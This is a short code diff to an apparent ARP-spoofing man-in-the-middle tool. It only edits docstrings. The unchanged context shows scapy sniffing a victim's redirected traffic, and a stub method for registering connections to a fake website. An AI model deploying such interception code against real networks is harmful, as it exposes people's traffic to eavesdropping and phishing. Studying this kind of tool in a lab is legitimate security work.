@@ -85,6 +85,7 @@ class Spoofer:
         """
         Performs MITM. 
         When the spoofing starts taking effect, all of the target computer's traffic will reach this machine.
+        Using scapy to sniff all of the packets from target to router, and calling process_packet to handle them.
         """
         scapy.sniff(filter=f"ip src {self.__target_ip} and ip dst not {self.__ip}",prn=self.process_packat,store=0) 
         # Capture all packets sent from the target, and not meant for host. because of the ARP spoofing, this packets are meant to be sent to the router.
@@ -93,7 +94,7 @@ class Spoofer:
     
     def register(self,fake_url,packet):
         """
-        register connection to fake website. not the IP, and such.
+        register connection to fake website. note the IP, and such.
         """
         raise NotImplementedError
     
